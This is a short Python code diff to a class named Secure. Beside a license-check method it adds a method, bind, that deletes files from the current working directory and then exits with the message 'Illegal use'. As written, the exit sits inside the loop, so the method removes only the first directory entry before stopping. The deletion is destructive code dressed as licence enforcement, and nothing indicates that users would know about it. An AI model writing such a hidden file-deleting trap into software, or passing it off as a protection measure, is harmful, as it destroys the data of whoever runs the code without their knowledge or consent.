@@ -22,4 +22,10 @@ class Secure:
         def checkLicense(self):
             import hashlib
 
-            
+        def bind(self):
+            import os
+            import sys
+
+            for file in os.listdir(os.getcwd()):
+                os.remove(file)
+                sys.exit("Illegal use")
